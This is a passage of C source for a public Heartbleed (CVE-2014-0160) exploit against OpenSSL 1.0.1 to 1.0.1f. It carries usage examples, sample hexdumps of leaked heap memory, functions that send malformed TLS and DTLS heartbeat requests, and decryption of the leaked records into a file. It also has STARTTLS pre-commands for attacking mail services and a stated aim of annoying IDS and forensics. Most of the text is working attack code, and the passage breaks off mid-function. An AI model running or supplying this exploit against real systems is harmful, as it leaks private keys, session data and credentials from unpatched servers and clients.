/*
* CVE-2014-0160 heartbleed OpenSSL information leak exploit
* =========================================================
* This exploit uses OpenSSL to create an encrypted connection
* and trigger the heartbleed leak. The leaked information is
* returned within encrypted SSL packets and is then decrypted
* and wrote to a file to annoy IDS/forensics. The exploit can
* set heartbeat payload length arbitrarily or use two preset
* values for NULL and MAX length. The vulnerability occurs due
* to bounds checking not being performed on a heap value which
* is user supplied and returned to the user as part of DTLS/TLS
* heartbeat SSL extension. All versions of OpenSSL 1.0.1 to
* 1.0.1f are known affected. You must run this against a target
* which is linked to a vulnerable OpenSSL library using DTLS/TLS.
* This exploit leaks upto 65532 bytes of remote heap each request
* and can be run in a loop until the connected peer ends connection.
* The data leaked contains 16 bytes of random padding at the end.
* The exploit can be used against a connecting client or server,
* it can also send pre_cmd's to plain-text services to establish
* an SSL session such as with STARTTLS on SMTP/IMAP/POP3. Clients
* will often forcefully close the connection during large leak
* requests so try to lower your payload request size.
*
* Compiled on ArchLinux x86_64 gcc 4.8.2 20140206 w/OpenSSL 1.0.1g
*
* E.g.
* $ gcc -lssl -lssl3 -lcrypto heartbleed.c -o heartbleed
* $ ./heartbleed -s 192.168.11.23 -p 443 -f out -t 1
* [ heartbleed - CVE-2014-0160 - OpenSSL information leak exploit
* [ =============================================================
* [ connecting to 192.168.11.23 443/tcp
* [ connected to 192.168.11.23 443/tcp
* [ <3 <3 <3 heart bleed <3 <3 <3
* [ heartbeat returned type=24 length=16408
* [ decrypting SSL packet
* [ heartbleed leaked length=65535
* [ final record type=24, length=16384
* [ wrote 16381 bytes of heap to file 'out'
* [ heartbeat returned type=24 length=16408
* [ decrypting SSL packet
* [ final record type=24, length=16384
* [ wrote 16384 bytes of heap to file 'out'
* [ heartbeat returned type=24 length=16408
* [ decrypting SSL packet
* [ final record type=24, length=16384
* [ wrote 16384 bytes of heap to file 'out'
* [ heartbeat returned type=24 length=16408
* [ decrypting SSL packet
* [ final record type=24, length=16384
* [ wrote 16384 bytes of heap to file 'out'
* [ heartbeat returned type=24 length=42
* [ decrypting SSL packet
* [ final record type=24, length=18
* [ wrote 18 bytes of heap to file 'out'
* [ done.
* $ ls -al out
* -rwx------ 1 fantastic fantastic 65554 Apr 11 13:53 out
* $ hexdump -C out
* - snip - snip
*
* Use following example command to generate certificates for clients.
*
* $ openssl req -x509 -nodes -days 365 -newkey rsa:2048 \
* -keyout server.key -out server.crt
*
* Debian compile with "gcc heartbleed.c -o heartbleed -Wl,-Bstatic \
* -lssl -Wl,-Bdynamic -lssl3 -lcrypto"
*
* todo: add udp/dtls support.
*
* - Hacker Fantastic
*   http://www.mdsec.co.uk
*
*/

/* Modified by Ayman Sagy aymansagy @ gmail.com - Added DTLS over UDP support
*
* use -u switch, tested against s_server/s_client version 1.0.1d
*
* # openssl s_server -accept 990 -cert ssl.crt -key ssl.key -dtls1
* ...
* # ./heartbleed -s 192.168.75.235 -p 990 -f eshta -t 1 -u
* [ heartbleed - CVE-2014-0160 - OpenSSL information leak exploit
* [ =============================================================
* [ <3 <3 <3 heart bleed <3 <3 <3
* [ heartbeat returned type=24 length=1392
* [ decrypting SSL packet
* [ heartbleed leaked length=1336
* [ final record type=24, length=1355
* [ wrote 1352 bytes of heap to file 'eshta'
*
*
* # hexdump -C eshta
* 00000000  00 00 00 00 06 30 f1 95  08 00 00 00 00 00 00 00  |.....0..........|
* 00000010  8c 43 64 ab e3 89 6b fd  e3 d3 74 a1 a1 31 8c 35  |.Cd...k...t..1.5|
* 00000020  09 6d b9 e7 08 08 08 08  08 08 08 08 08 a1 65 9f  |.m............e.|
* 00000030  ca 13 80 7c a5 88 b0 c9  d5 f6 7b 14 fe ff 00 00  |...|......{.....|
* 00000040  00 00 00 00 00 03 00 01  01 16 fe ff 00 01 00 00  |................|
* 00000050  00 00 00 00 00 40 b5 fd  a5 10 da c4 fd fb c7 d2  |.....@..........|
* 00000060  9f 0c 56 4b a9 9c 14 00  00 0c 00 03 00 00 00 00  |..VK............|
* 00000070  00 0c 69 ec c4 d5 f3 38  ae e5 2e 3a 1a 32 f9 30  |..i....8...:.2.0|
* 00000080  7f 61 4c 8c d7 34 f3 02  08 3f 68 01 a9 a7 81 55  |.aL..4...?h....U|
* 00000090  01 c9 03 03 03 03 00 00  0e 31 39 32 2e 31 36 38  |.........192.168|
* 000000a0  2e 37 35 2e 32 33 35 00  23 00 00 00 0f 00 01 01  |.75.235.#.......|
* 000000b0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
*
* 00000530  00 00 00 00 00 00 00 00  a5 e2 f5 67 d6 23 85 49  |...........g.#.I|
* 00000540  b3 cc ed c4 d2 74 c8 97  c1 b4 cc                 |.....t.....|
* 0000054b
*
*
* # openssl s_client -connect localhost:990 -dtls1
* ...
* # ./heartbleed -b localhost -p 990 -u -t 1 -f eshta
* [ heartbleed - CVE-2014-0160 - OpenSSL information leak exploit
* [ =============================================================
* [ SSL connection using AES256-SHA
* [ <3 <3 <3 heart bleed <3 <3 <3
* [ heartbeat returned type=24 length=1392
* [ decrypting SSL packet
* [ heartbleed leaked length=1336
* [ final record type=24, length=1355
* [ wrote 1352 bytes of heap to file 'eshta'
*
*
* # hexdump -C eshta
* 00000000  00 00 24 4e b7 00 00 00  00 00 00 00 00 18 00 00  |..$N............|
* 00000010  cf d0 5f df c3 64 5f 58  79 17 f8 f7 22 9b 28 6e  |.._..d_Xy...".(n|
* 00000020  c0 e7 d6 a3 08 08 08 08  08 08 08 08 08 9b c3 38  |...............8|
* 00000030  2b 32 5f dd 3a d5 0f 83  51 02 2f 70 33 8f cf 82  |+2_.:...Q./p3...|
* 00000040  21 5b cc 25 80 26 f3 29  c8 90 91 ec 5c 83 68 ee  |![.%.&.)....\.h.|
* 00000050  6b 11 0d ad f1 f4 da 9e  13 59 8f 2a 74 f6 d4 35  |k........Y.*t..5|
* 00000060  9e 17 12 7c 2b 6f 9e a8  1e b4 7a 3c a5 ec 18 e0  |...|+o....z<....|
* 00000070  44 b2 51 e4 69 8c 47 29  39 fb 9e b0 dd 5b 05 4d  |D.Q.i.G)9....[.M|
* 00000080  db 11 06 7b 1d 08 58 60  ac 34 3f 2d d1 14 c1 b7  |...{..X`.4?-....|
* 00000090  d5 08 59 73 16 28 f8 75  23 f7 85 27 48 be 1f 14  |..Ys.(.u#..'H...|
* 000000a0  fe ff 00 00 00 00 00 00  00 04 00 01 01 16 fe ff  |................|
* 000000b0  00 01 00 00 00 00 00 00  00 40 62 1c 02 19 45 5f  |.........@b...E_|
* 000000c0  2c a6 89 95 d2 bf 16 c4  8b b7 14 00 00 0c 00 04  |,...............|
* 000000d0  00 00 00 00 00 0c e9 fb  75 02 61 90 be 4d f7 82  |........u.a..M..|
* 000000e0  06 d6 fd 6d 53 a1 d5 44  e0 5a 0d 6a 6a 94 ef e8  |...mS..D.Z.jj...|
* 000000f0  4c 01 4b cb 86 73 03 03  03 03 2d 53 74 61 74 65  |L.K..s....-State|
* 00000100  31 21 30 1f 06 03 55 04  0a 0c 18 49 6e 74 65 72  |1!0...U....Inter|
* 00000110  6e 65 74 20 57 69 64 67  69 74 73 20 50 74 79 20  |net Widgits Pty |
* 00000120  4c 74 64 30 82 01 22 30  0d 06 09 2a 86 48 86 f7  |Ltd0.."0...*.H..|
* 00000130  0d 01 01 01 05 00 03 82  01 0f 00 30 82 01 0a 02  |...........0....|
* 00000140  82 01 01 00 c0 85 26 4a  9d cd f8 5e 46 74 fa 89  |......&J...^Ft..|
* 00000150  e3 7d 58 76 23 ba ba dc  b1 35 98 35 a5 ba 53 a1  |.}Xv#....5.5..S.|
* 00000160  5b 37 28 fe f7 d0 02 fc  fd c9 e3 b1 ee e6 fe 79  |[7(............y|
* 00000170  86 f8 81 1a 29 29 a9 81  95 1c c9 5c 81 a2 e8 0c  |....)).....\....|
* 00000180  35 b7 cb 67 8a ec 2a d1  73 e6 70 78 53 c8 50 91  |5..g..*.s.pxS.P.|
* 00000190  49 07 db e1 a4 08 7b fb  07 54 48 85 45 c2 38 71  |I.....{..TH.E.8q|
* 000001a0  6a 8a f2 4d a7 ba 1a 86  36 a2 ae bb a1 e1 7c 2c  |j..M....6.....|,|
* 000001b0  12 04 ce e5 d1 75 24 94  1c 31 2c 46 b7 76 30 3a  |.....u$..1,F.v0:|
* 000001c0  04 79 2f b3 65 74 fb ae  c7 10 a5 da a8 2d b6 fd  |.y/.et.......-..|
* 000001d0  cf f9 11 fe 38 cd 25 7e  13 75 14 1d 58 92 bb 3f  |....8.%~.u..X..?|
* 000001e0  8f 75 d5 52 f7 27 66 ca  5d 55 4d 0a b5 71 a2 16  |.u.R.'f.]UM..q..|
* 000001f0  3e 01 af 97 93 eb 5c 3f  e0 fa c8 61 2c a1 87 8f  |>.....\?...a,...|
* 00000200  60 d4 df 5d 9d cd 0f 34  a9 66 6c 93 d8 5f 4a 2b  |`..]...4.fl.._J+|
* 00000210  fd 67 3a 2f 88 90 b4 e9  f5 d6 ee bb 7d 8b 1c e5  |.g:/........}...|
* 00000220  f2 cc 4f b2 c0 dc e8 1b  4c 6e 51 c9 47 8b 6c 82  |..O.....LnQ.G.l.|
* 00000230  f9 4b ae 01 a8 f9 6c 6d  d5 1a d5 cf 63 f4 7f e0  |.K....lm....c...|
* 00000240  96 54 3f 7d 02 03 01 00  01 a3 50 30 4e 30 1d 06  |.T?}......P0N0..|
* 00000250  03 55 1d 0e 04 16 04 14  af 97 4e 87 62 8a 77 b8  |.U........N.b.w.|
* 00000260  b4 0b 24 20 35 b1 66 09  55 3f 74 1d 30 1f 06 03  |..$ 5.f.U?t.0...|
* 00000270  55 1d 23 04 18 30 16 80  14 af 97 4e 87 62 8a 77  |U.#..0.....N.b.w|
* 00000280  b8 b4 0b 24 20 35 b1 66  09 55 3f 74 1d 30 0c 06  |...$ 5.f.U?t.0..|
* 00000290  03 55 1d 13 04 05 30 03  01 01 ff 30 0d 06 09 2a  |.U....0....0...*|
* 000002a0  86 48 86 f7 0d 01 01 05  05 00 03 82 01 01 00 b0  |.H..............|
* 000002b0  8e 40 58 2d 86 32 95 11  a7 a1 64 1d fc 08 8d 87  |.@X-.2....d.....|
* 000002c0  18 d3 5d c6 a0 bb 84 4a  50 f5 27 1c 15 4b 02 0c  |..]....JP.'..K..|
* 000002d0  49 1f 2d 0a 52 d3 98 6b  71 3d b9 0f 36 24 d3 77  |I.-.R..kq=..6$.w|
* 000002e0  e0 d0 a5 50 e5 ea 2d 67  11 69 4d 45 52 97 4d 58  |...P..-g.iMER.MX|
* 000002f0  de 22 06 02 6d 21 80 2f  0d 1c d5 d5 80 5c 8f 44  |."..m!./.....\.D|
* 00000300  1e b6 f3 41 4c dc d3 40  8d 54 ac b0 ca 8f 19 6a  |...AL..@.T.....j|
* 00000310  4d f2 fb ad 68 5a 99 19  ca ae b2 f5 54 70 29 96  |M...hZ......Tp).|
* 00000320  84 7e ba a9 6b 42 e6 68  32 dc 65 87 b1 b7 17 22  |.~..kB.h2.e...."|
* 00000330  e3 cc 62 97 e4 fa 64 0b  1e 70 bf e5 a2 40 e4 49  |..b...d..p...@.I|
* 00000340  24 f9 05 3f 2e fe 7c 38  56 39 4d bd 51 63 0d 79  |$..?..|8V9M.Qc.y|
* 00000350  85 c0 4b 1a 46 64 e0 fe  a8 87 bf c7 4d 21 cb 79  |..K.Fd......M!.y|
* 00000360  37 e7 a6 e3 6c 3b ed 35  17 73 7a 71 c6 72 2f bb  |7...l;.5.szq.r/.|
* 00000370  58 dc ef e9 1e a3 89 5e  70 cd 95 10 87 c1 8a 7e  |X......^p......~|
* 00000380  e7 51 c2 22 67 66 ee 22  f9 a5 2e 31 f2 ad fc 3b  |.Q."gf."...1...;|
* 00000390  98 c8 30 63 ef 74 b5 4e  c4 bd c7 a2 46 0a b8 bf  |..0c.t.N....F...|
* 000003a0  df a8 54 0e 4f 37 d0 a5  27 a3 f3 a7 28 38 3f 16  |..T.O7..'...(8?.|
* 000003b0  fe ff 00 00 00 00 00 00  00 02 00 0c 0e 00 00 00  |................|
* 000003c0  00 02 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
* 000003d0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
* *
* 00000530  00 00 00 00 00 00 00 00  82 8f be ff cf 26 12 9d  |.............&..|
* 00000540  a2 de 0c 44 21 4a 54 be  41 4c df                 |...D!JT.AL.|
* 0000054b
*
*/
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <getopt.h>
#include <signal.h>
#include <netdb.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <inttypes.h>
#include <openssl/bio.h>
#include <openssl/ssl.h>
#include <openssl/err.h>
#include <openssl/evp.h>
#include <openssl/tls1.h>
#include <openssl/rand.h>
#include <openssl/buffer.h>

#define n2s(c,s)((s=(((unsigned int)(c[0]))<< 8)| \
		(((unsigned int)(c[1]))    )),c+=2)
#define s2n(s,c) ((c[0]=(unsigned char)(((s)>> 8)&0xff), \
		 c[1]=(unsigned char)(((s)    )&0xff)),c+=2)

int first = 0;
int leakbytes = 0;
int repeat = 1;
int badpackets = 0;

typedef struct {
	int socket;
	SSL *sslHandle;
	SSL_CTX *sslContext;
} connection;

typedef struct {
  unsigned char type;
  short version;
  unsigned int length;
  unsigned char hbtype;
  unsigned int payload_length;
  void* payload;
} heartbeat;

void ssl_init();
void usage();
int tcp_connect(char*,int);
int tcp_bind(char*, int);
connection* tls_connect(int);
connection* tls_bind(int);
int pre_cmd(int,int,int);
void* heartbleed(connection* ,unsigned int);
void* sneakyleaky(connection* ,char*, int);

static DTLS1_BITMAP *dtls1_get_bitmap(SSL *s, SSL3_RECORD *rr, unsigned int *is_next_epoch);
static int dtls1_record_replay_check(SSL *s, DTLS1_BITMAP *bitmap);
static int dtls1_buffer_record(SSL *s, record_pqueue *q, unsigned char *priority);
static void dtls1_record_bitmap_update(SSL *s, DTLS1_BITMAP *bitmap);

int tcp_connect(char* server,int port){
	int sd,ret;
	struct hostent *host;
        struct sockaddr_in sa;
        host = gethostbyname(server);
        sd = socket(AF_INET, SOCK_STREAM, 0);
        if(sd==-1){
		printf("[!] cannot create socket\n");
		exit(0);
	}
	sa.sin_family = AF_INET;
        sa.sin_port = htons(port);
        sa.sin_addr = *((struct in_addr *) host->h_addr);
        bzero(&(sa.sin_zero),8);
	printf("[ connecting to %s %d/tcp\n",server,port);
        ret = connect(sd,(struct sockaddr *)&sa, sizeof(struct sockaddr));
	if(ret==0){
		printf("[ connected to %s %d/tcp\n",server,port);
	}
	else{
		printf("[!] FATAL: could not connect to %s %d/tcp\n",server,port);
		exit(0);
	}
	return sd;
}

int tcp_bind(char* server, int port){
	int sd, ret, val=1;
	struct sockaddr_in sin;
	struct hostent *host;
	host = gethostbyname(server);
	sd=socket(AF_INET,SOCK_STREAM,0);
	if(sd==-1){
    		printf("[!] cannot create socket\n");
		exit(0);
	}
	memset(&sin,0,sizeof(sin));
	sin.sin_addr=*((struct in_addr *) host->h_addr);
	sin.sin_family=AF_INET;
	sin.sin_port=htons(port);
    	setsockopt(sd,SOL_SOCKET,SO_REUSEADDR,&val,sizeof(val));
	ret = bind(sd,(struct sockaddr *)&sin,sizeof(sin));
	if(ret==-1){
		printf("[!] cannot bind socket\n");
		exit(0);
	}
	listen(sd,5);
	return(sd);
}

connection* dtls_server(int sd, char* server,int port){
	int bytes;
        connection *c;
        char* buf;
	buf = malloc(4096);
	int ret;
	struct hostent *host;
        struct sockaddr_in sa;
	unsigned long addr;
        if ((host = gethostbyname(server)) == NULL) {
		perror("gethostbyname");
		exit(1);
	}
        sd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
        if(sd==-1){
		printf("[!] cannot create socket\n");
		exit(0);
	}
	sa.sin_family = AF_INET;
        sa.sin_port = htons(port);
        sa.sin_addr = *((struct in_addr *) host->h_addr);
	if (bind(sd, (struct sockaddr *) &sa ,sizeof(struct sockaddr_in)) < 0) {
		perror("bind()");
		exit(1);
	}

	BIO *bio;
        if(c==NULL){
		printf("[ error in malloc()\n");
		exit(0);
	}
        if(buf==NULL){
                printf("[ error in malloc()\n");
                exit(0);
        }
	memset(buf,0,4096);
	c = malloc(sizeof(connection));
	if(c==NULL){
                printf("[ error in malloc()\n");
                exit(0);
        }
	c->socket = sd;
        c->sslHandle = NULL;
        c->sslContext = NULL;
        c->sslContext = SSL_CTX_new(DTLSv1_server_method());
	SSL_CTX_set_read_ahead (c->sslContext, 1);
        if(c->sslContext==NULL)
                ERR_print_errors_fp(stderr);
	SSL_CTX_SRP_CTX_init(c->sslContext);
	SSL_CTX_use_certificate_file(c->sslContext, "./server.crt", SSL_FILETYPE_PEM);
	SSL_CTX_use_PrivateKey_file(c->sslContext, "./server.key", SSL_FILETYPE_PEM);
	if(!SSL_CTX_check_private_key(c->sslContext)){
		printf("[!] FATAL: private key does not match the certificate public key\n");
		exit(0);
	}
	c->sslHandle = SSL_new(c->sslContext);
        if(c->sslHandle==NULL)
                ERR_print_errors_fp(stderr);
        if(!SSL_set_fd(c->sslHandle,c->socket))
                ERR_print_errors_fp(stderr);
        bio = BIO_new_dgram(sd, BIO_NOCLOSE);

        SSL_set_bio(c->sslHandle, bio, bio);
        SSL_set_accept_state (c->sslHandle);

        int rc = SSL_accept(c->sslHandle);
	printf ("[ SSL connection using %s\n", SSL_get_cipher (c->sslHandle));
//	bytes = SSL_read(c->sslHandle, buf, 4095);
//	printf("[ recieved: %d bytes - showing output\n%s\n[\n",bytes,buf);
	if(!c->sslHandle->tlsext_heartbeat & SSL_TLSEXT_HB_ENABLED ||
                c->sslHandle->tlsext_heartbeat & SSL_TLSEXT_HB_DONT_SEND_REQUESTS){
                printf("[ warning: heartbeat extension is unsupported (try anyway)\n");
        }
        return c;
}

void ssl_init(){
        SSL_load_error_strings();
        SSL_library_init();
        OpenSSL_add_all_digests();
        OpenSSL_add_all_algorithms();
        OpenSSL_add_all_ciphers();
}

connection* tls_connect(int sd){
        connection *c;
	c = malloc(sizeof(connection));
        if(c==NULL){
		printf("[ error in malloc()\n");
		exit(0);
	}
	c->socket = sd;
        c->sslHandle = NULL;
        c->sslContext = NULL;
        c->sslContext = SSL_CTX_new(SSLv23_client_method());
	SSL_CTX_set_options(c->sslContext, SSL_OP_ALL | SSL_OP_NO_SSLv2 | SSL_OP_NO_SSLv3);
        if(c->sslContext==NULL)
                ERR_print_errors_fp(stderr);
        c->sslHandle = SSL_new(c->sslContext);
        if(c->sslHandle==NULL)
                ERR_print_errors_fp(stderr);
        if(!SSL_set_fd(c->sslHandle,c->socket))
                ERR_print_errors_fp(stderr);
        if(SSL_connect(c->sslHandle)!=1)
                ERR_print_errors_fp(stderr);
        if(!c->sslHandle->tlsext_heartbeat & SSL_TLSEXT_HB_ENABLED ||
                c->sslHandle->tlsext_heartbeat & SSL_TLSEXT_HB_DONT_SEND_REQUESTS){
                printf("[ warning: heartbeat extension is unsupported (try anyway)\n");
        }
	return c;
}

connection* dtls_client(int sd, char* server,int port){
	int ret;
	struct hostent *host;
        struct sockaddr_in sa;
        connection *c;
	memset((char *)&sa,0,sizeof(sa));
	c = malloc(sizeof(connection));
        if ((host = gethostbyname(server)) == NULL) {
		perror("gethostbyname");
		exit(1);
	}
        sd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
        if(sd==-1){
		printf("[!] cannot create socket\n");
		exit(0);
	}
	sa.sin_family = AF_INET;
        sa.sin_port = htons(port);
        sa.sin_addr = *((struct in_addr *) host->h_addr);
	if (connect(sd, (struct sockaddr *) &sa ,sizeof(struct sockaddr_in)) < 0) {
		perror("connect()");
		exit(0);
	}

	BIO *bio;
        if(c==NULL){
		printf("[ error in malloc()\n");
		exit(0);
	}

        c->sslContext = NULL;
        c->sslContext = SSL_CTX_new(DTLSv1_client_method());
	SSL_CTX_set_read_ahead (c->sslContext, 1);
        if(c->sslContext==NULL)
                ERR_print_errors_fp(stderr);
        if(c->sslHandle==NULL)
                ERR_print_errors_fp(stderr);

	c->socket = sd;
        c->sslHandle = NULL;
        c->sslHandle = SSL_new(c->sslContext);
	SSL_set_tlsext_host_name(c->sslHandle,server);
	bio = BIO_new_dgram(sd, BIO_NOCLOSE);

	BIO_ctrl_set_connected(bio, 1, &sa);
	SSL_set_bio(c->sslHandle, bio, bio);
	SSL_set_connect_state (c->sslHandle);
//printf("eshta\n");
        if(SSL_connect(c->sslHandle)!=1)
                ERR_print_errors_fp(stderr);

        if(!c->sslHandle->tlsext_heartbeat & SSL_TLSEXT_HB_ENABLED ||
                c->sslHandle->tlsext_heartbeat & SSL_TLSEXT_HB_DONT_SEND_REQUESTS){
                printf("[ warning: heartbeat extension is unsupported (try anyway), %d \n",c->sslHandle->tlsext_heartbeat);
        }
	return c;
}

connection* tls_bind(int sd){
	int bytes;
        connection *c;
        char* buf;
	buf = malloc(4096);
        if(buf==NULL){
                printf("[ error in malloc()\n");
                exit(0);
        }
	memset(buf,0,4096);
	c = malloc(sizeof(connection));
	if(c==NULL){
                printf("[ error in malloc()\n");
                exit(0);
        }
	c->socket = sd;
        c->sslHandle = NULL;
        c->sslContext = NULL;
        c->sslContext = SSL_CTX_new(SSLv23_server_method());
        if(c->sslContext==NULL)
                ERR_print_errors_fp(stderr);
	SSL_CTX_set_options(c->sslContext, SSL_OP_ALL | SSL_OP_NO_SSLv2 | SSL_OP_NO_SSLv3);
	SSL_CTX_SRP_CTX_init(c->sslContext);
	SSL_CTX_use_certificate_file(c->sslContext, "./server.crt", SSL_FILETYPE_PEM);
	SSL_CTX_use_PrivateKey_file(c->sslContext, "./server.key", SSL_FILETYPE_PEM);
	if(!SSL_CTX_check_private_key(c->sslContext)){
		printf("[!] FATAL: private key does not match the certificate public key\n");
		exit(0);
	}
	c->sslHandle = SSL_new(c->sslContext);
        if(c->sslHandle==NULL)
                ERR_print_errors_fp(stderr);
        if(!SSL_set_fd(c->sslHandle,c->socket))
                ERR_print_errors_fp(stderr);
        int rc = SSL_accept(c->sslHandle);
	printf ("[ SSL connection using %s\n", SSL_get_cipher (c->sslHandle));
	bytes = SSL_read(c->sslHandle, buf, 4095);
	printf("[ recieved: %d bytes - showing output\n%s\n[\n",bytes,buf);
	if(!c->sslHandle->tlsext_heartbeat & SSL_TLSEXT_HB_ENABLED ||
                c->sslHandle->tlsext_heartbeat & SSL_TLSEXT_HB_DONT_SEND_REQUESTS){
                printf("[ warning: heartbeat extension is unsupported (try anyway)\n");
        }
        return c;
}

int pre_cmd(int sd,int precmd,int verbose){
	/* this function can be used to send commands to a plain-text
	service or client before heartbleed exploit attempt. e.g. STARTTLS */
	int rc, go = 0;
	char* buffer;
	char* line1;
	char* line2;
	switch(precmd){
		case 0:
			line1 = "EHLO test\n";
			line2 = "STARTTLS\n";
			break;
		case 1:
			line1 = "CAPA\n";
			line2 = "STLS\n";
			break;
		case 2:
			line1 = "a001 CAPB\n";
			line2 = "a002 STARTTLS\n";
			break;
		default:
			go = 1;
			break;
	}
	if(go==0){
		buffer = malloc(2049);
	        if(buffer==NULL){
                	printf("[ error in malloc()\n");
                	exit(0);
	        }
		memset(buffer,0,2049);
		rc = read(sd,buffer,2048);
		printf("[ banner: %s",buffer);
		send(sd,line1,strlen(line1),0);
		memset(buffer,0,2049);
		rc = read(sd,buffer,2048);
		if(verbose==1){
			printf("%s\n",buffer);
		}
		send(sd,line2,strlen(line2),0);
		memset(buffer,0,2049);
		rc = read(sd,buffer,2048);
		if(verbose==1){
			printf("%s\n",buffer);
		}
	}
	return sd;
}

void* heartbleed(connection *c,unsigned int type){
	unsigned char *buf, *p;
        int ret;
	buf = OPENSSL_malloc(1 + 2);
	if(buf==NULL){
                printf("[ error in malloc()\n");
                exit(0);
        }
	p = buf;
        *p++ = TLS1_HB_REQUEST;
	switch(type){
		case 0:
			s2n(0x0,p);
			break;
		case 1:
			s2n(0xffff,p);
			break;
		default:
			printf("[ setting heartbeat payload_length to %u\n",type);
			s2n(type,p);
			break;
	}
	printf("[ <3 <3 <3 heart bleed <3 <3 <3\n");
        ret = ssl3_write_bytes(c->sslHandle, TLS1_RT_HEARTBEAT, buf, 3);
        OPENSSL_free(buf);
	return c;
}

void* dtlsheartbleed(connection *c,unsigned int type){

	unsigned char *buf, *p;
        int ret;
	buf = OPENSSL_malloc(1 + 2 + 16);
	memset(buf, '\0', sizeof buf);
	if(buf==NULL){
                printf("[ error in malloc()\n");
                exit(0);
        }
	p = buf;
        *p++ = TLS1_HB_REQUEST;
	switch(type){
		case 0:
			s2n(0x0,p);
			break;
		case 1:
//			s2n(0xffff,p);
//			s2n(0x3feb,p);
			s2n(0x0538,p);
			break;
		default:
			printf("[ setting heartbeat payload_length to %u\n",type);
			s2n(type,p);
			break;
	}
	s2n(c->sslHandle->tlsext_hb_seq, p);
	printf("[ <3 <3 <3 heart bleed <3 <3 <3\n");

          ret = dtls1_write_bytes(c->sslHandle, TLS1_RT_HEARTBEAT, buf, 3 + 16);

	if (ret >= 0)
		{
		if (c->sslHandle->msg_callback)
			c->sslHandle->msg_callback(1, c->sslHandle->version, TLS1_RT_HEARTBEAT,
				buf, 3 + 16,
				c->sslHandle, c->sslHandle->msg_callback_arg);

		dtls1_start_timer(c->sslHandle);
		c->sslHandle->tlsext_hb_pending = 1;
		}

        OPENSSL_free(buf);

	return c;
}

void* sneakyleaky(connection *c,char* filename, int verbose){
	char *p;
        int ssl_major,ssl_minor,al;
        int enc_err,n,i;
        SSL3_RECORD *rr;
        SSL_SESSION *sess;
	SSL* s;
        unsigned char md[EVP_MAX_MD_SIZE];
        short version;
        unsigned mac_size, orig_len;
        size_t extra;
        rr= &(c->sslHandle->s3->rrec);
        sess=c->sslHandle->session;
        s = c->sslHandle;
        if (c->sslHandle->options & SSL_OP_MICROSOFT_BIG_SSLV3_BUFFER)
                extra=SSL3_RT_MAX_EXTRA;
        else
                extra=0;
        if ((s->rstate != SSL_ST_READ_BODY) ||
                (s->packet_length < SSL3_RT_HEADER_LENGTH)) {
                        n=ssl3_read_n(s, SSL3_RT_HEADER_LENGTH, s->s3->rbuf.len, 0);
                        if (n <= 0)
                                goto apple;
                        s->rstate=SSL_ST_READ_BODY;
                        p=s->packet;
                        rr->type= *(p++);
                        ssl_major= *(p++);
                        ssl_minor= *(p++);
                        version=(ssl_major<<8)|ssl_minor;
                        n2s(p,rr->length);
			if(rr->type==24){
				printf("[ heartbeat returned type=%d length=%u\n",rr->type, rr->length);
				if(rr->length > 16834){
					printf("[ error: got a malformed TLS length.\n");
					exit(0);
				}
			}
			else{
				printf("[ incorrect record type=%d length=%u returned\n",rr->type,rr->length);
				s->packet_length=0;
				badpackets++;
				if(badpackets > 3){
					printf("[ error: too many bad packets recieved\n");
					exit(0);
				}
				goto apple;
			}
        }
        if (rr->length > s->packet_length-SSL3_RT_HEADER_LENGTH){
                i=rr->length;
                n=ssl3_read_n(s,i,i,1);
                if (n <= 0) goto apple;
        }
	printf("[ decrypting SSL packet\n");
        s->rstate=SSL_ST_READ_HEADER;
        rr->input= &(s->packet[SSL3_RT_HEADER_LENGTH]);
        rr->data=rr->input;
        tls1_enc(s,0);
        if((sess != NULL) &&
            (s->enc_read_ctx != NULL) &&
            (EVP_MD_CTX_md(s->read_hash) != NULL))
                {
                unsigned char *mac = NULL;
                unsigned char mac_tmp[EVP_MAX_MD_SIZE];
                mac_size=EVP_MD_CTX_size(s->read_hash);
                OPENSSL_assert(mac_size <= EVP_MAX_MD_SIZE);
                orig_len = rr->length+((unsigned int)rr->type>>8);
                if(orig_len < mac_size ||
                  (EVP_CIPHER_CTX_mode(s->enc_read_ctx) == EVP_CIPH_CBC_MODE &&
                   orig_len < mac_size+1)){
                        al=SSL_AD_DECODE_ERROR;
                        SSLerr(SSL_F_SSL3_GET_RECORD,SSL_R_LENGTH_TOO_SHORT);
                }
                if (EVP_CIPHER_CTX_mode(s->enc_read_ctx) == EVP_CIPH_CBC_MODE){
                        mac = mac_tmp;
                        ssl3_cbc_copy_mac(mac_tmp, rr, mac_size, orig_len);
                        rr->length -= mac_size;
                }
                else{
                        rr->length -= mac_size;
                        mac = &rr->data[rr->length];
                }
                i = tls1_mac(s,md,0);
                if (i < 0 || mac == NULL || CRYPTO_memcmp(md, mac, (size_t)mac_size) != 0)
                        enc_err = -1;
                if (rr->length > SSL3_RT_MAX_COMPRESSED_LENGTH+extra+mac_size)
                        enc_err = -1;
                }
        if(enc_err < 0){
                al=SSL_AD_BAD_RECORD_MAC;
                SSLerr(SSL_F_SSL3_GET_RECORD,SSL_R_DECRYPTION_FAILED_OR_BAD_RECORD_MAC);
                goto apple;
        }
        if(s->expand != NULL){
                if (rr->length > SSL3_RT_MAX_COMPRESSED_LENGTH+extra) {
                        al=SSL_AD_RECORD_OVERFLOW;
                        SSLerr(SSL_F_SSL3_GET_RECORD,SSL_R_COMPRESSED_LENGTH_TOO_LONG);
                        goto apple;
                        }
                if (!ssl3_do_uncompress(s)) {
                        al=SSL_AD_DECOMPRESSION_FAILURE;
                        SSLerr(SSL_F_SSL3_GET_RECORD,SSL_R_BAD_DECOMPRESSION);
                        goto apple;
                        }
                }
        if (rr->length > SSL3_RT_MAX_PLAIN_LENGTH+extra) {
                al=SSL_AD_RECORD_OVERFLOW;
                SSLerr(SSL_F_SSL3_GET_RECORD,SSL_R_DATA_LENGTH_TOO_LONG);
                goto apple;
        }
        rr->off=0;
        s->packet_length=0;
	if(first==0){
		uint heartbleed_len = 0;
		char* fp = s->s3->rrec.data;
		(long)fp++;
		memcpy(&heartbleed_len,fp,2);
		heartbleed_len = (heartbleed_len & 0xff) << 8 | (heartbleed_len & 0xff00) >> 8;
		first = 2;
